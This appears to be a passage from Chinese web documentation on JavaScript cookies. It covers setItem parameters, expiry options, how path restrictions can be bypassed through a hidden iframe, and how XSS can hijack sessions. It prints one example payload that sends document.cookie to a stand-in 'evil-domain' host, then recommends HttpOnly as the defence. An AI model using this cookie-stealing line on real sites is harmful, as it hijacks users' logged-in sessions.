docCookies.setItem(name, value[, end[, path[, domain[, secure]]]])

;max-age=max-age-in-seconds (例如一年为 60*60*24*365)
;expires=date-in-GMTString-format 如果没有定义，cookie 会在对话结束时过期


路径限制并不能阻止从其他路径访问 cookie. 使用简单的 DOM 即可轻易地绕过限制 (比如创建一个指向限制路径的，隐藏的iframe, 然后访问其 contentDocument.cookie 属性). 保护 cookie 不被非法访问的唯一方法是将它放在另一个域名/子域名之下，利用同源策略保护其不被读取。

Web 应用程序通常使用 cookies 来标识用户身份及他们的登录会话。因此通过窃听这些 cookie，就可以劫持已登录用户的会话。窃听的 cookie 的常见方法包括社会工程和 XSS 攻击 -

(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;

HttpOnly 属性可以阻止通过 javascript 访问 cookie，从而一定程度上遏制这类攻击。参见 Cookies and Security.